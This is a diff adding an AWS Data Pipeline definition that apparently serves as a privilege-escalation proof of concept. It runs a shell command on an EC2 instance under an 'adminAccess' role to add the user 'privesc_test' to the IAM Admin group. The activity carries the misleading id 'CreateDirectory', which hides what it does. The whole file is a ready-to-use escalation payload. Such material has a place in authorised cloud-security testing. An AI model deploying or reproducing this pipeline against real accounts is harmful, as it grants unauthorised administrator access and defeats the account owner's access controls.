@@ -1,0 +1,30 @@
+{
+     "objects": [
+     {
+         "id" : "CreateDirectory",
+         "type" : "ShellCommandActivity",
+         "command" : "aws iam add-user-to-group --group-name Admin --user-name privesc_test",
+         "runsOn" : {"ref": "instance"}
+     },
+     {
+         "id": "Default",
+         "scheduleType": "ondemand",
+         "failureAndRerunMode": "CASCADE",
+         "name": "Default",
+         "role": "adminAccess",
+         "resourceRole": "adminAccess"
+     },
+     {
+         "id" : "instance",
+         "name" : "instance",
+         "type" : "Ec2Resource",
+         "actionOnTaskFailure" : "terminate",
+         "actionOnResourceFailure" : "retryAll",
+         "maximumRetries" : "1",
+         "instanceType" : "t2.micro",
+         "securityGroups" : ["default"],
+         "keyPair" : "test",
+         "role" : "adminaccess",
+         "resourceRole" : "adminaccess"
+     }]
+}
